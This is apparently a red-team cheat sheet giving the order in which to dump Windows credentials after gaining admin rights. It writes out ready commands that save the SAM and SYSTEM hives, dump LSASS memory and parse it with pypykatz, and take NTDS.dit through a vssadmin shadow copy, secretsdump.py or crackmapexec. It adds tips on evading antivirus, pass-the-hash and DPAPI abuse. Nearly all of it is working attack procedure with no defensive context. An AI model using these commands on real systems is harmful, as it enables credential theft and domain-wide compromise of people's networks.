ðŸ”¥ "Got Admin, Now What?" â€“ Order of Operations
âœ… 1. Check Privileges
Are you local admin or domain admin?

You can still dump SAM and LSASS with local admin, but NTDS requires domain admin.

ðŸ§  Step 1: Dump SAM + SYSTEM
Why? Fast and easy â€” gives you local user hashes.

Command:

cmd
Copy
Edit
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
Transfer and use:

bash
Copy
Edit
secretsdump.py -sam sam.save -system system.save LOCAL
When? Do this first. Quick win, low noise, easy lateral creds.

ðŸ§  Step 2: Dump LSASS
Why? Potential for plaintext creds, NT hashes, DPAPI keys, Kerberos tickets.

Method: rundll32, task manager GUI, or procdump if AV isnâ€™t screaming.

Transfer and:

bash
Copy
Edit
pypykatz lsa minidump /path/to/lsass.dmp
When? After SAM. Good mix of plaintext and hash extraction.

ðŸ§  Step 3: Dump NTDS.dit
Why? You own the entire domain at this point.

Requires:

Domain Admin rights

Shadow copy + copy NTDS.dit and SYSTEM hive

Or use:

bash
Copy
Edit
crackmapexec smb <IP> -u admin -p pass --ntds
When? Last â€” biggest file, most sensitive, highest reward. Donâ€™t do this unless youâ€™re quiet or donâ€™t care about detection.

ðŸ§Š TL;DR Flow for Your Notes
markdown
Copy
Edit
## Got Admin? ðŸª“ Dump Priority Order

1. ðŸ§‚ **SAM + SYSTEM**
   - `reg.exe save hklm\sam C:\sam.save`
   - `reg.exe save hklm\system C:\system.save`
   - Offline crack w/ `secretsdump.py`

2. ðŸ§  **LSASS**
   - GUI (Task Manager) or `rundll32` dump
   - Parse with `pypykatz`
   - Get plaintext creds, hashes, DPAPI keys

3. ðŸ‘‘ **NTDS.dit**
   - Needs Domain Admin
   - Use VSS: `vssadmin create shadow /for=C:`
   - Copy `NTDS.dit` from shadow, dump with `secretsdump.py` or `cme --ntds`

### Tip:
âœ… Crack what you can  
âœ… PtH what you canâ€™t  
âœ… DPAPI what they forgot
